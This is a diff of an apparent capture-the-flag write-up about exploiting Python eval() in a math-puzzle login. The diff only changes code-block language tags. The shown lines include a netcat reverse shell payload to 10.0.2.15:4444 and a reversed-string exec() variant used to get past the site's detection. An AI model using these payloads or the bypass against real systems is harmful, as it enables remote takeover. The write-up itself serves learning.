@@ -60,7 +60,7 @@ Login requires to solve a math problem, using python `eval()` you can solve it
 
 I tried to spawn a reverse shell using :
 
-```sh
+```python
 __import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
 ```
 But the website detected my malicious code
@@ -129,7 +129,7 @@ First i need to change my malicious code to reverse order
 
 **Malicious code**
 
-```python3
+```python
 exec(')"4444 51.2.0.01 hs/nib/ e- cn"(metsys.so ;so tropmi'[::-1])
 ```
 
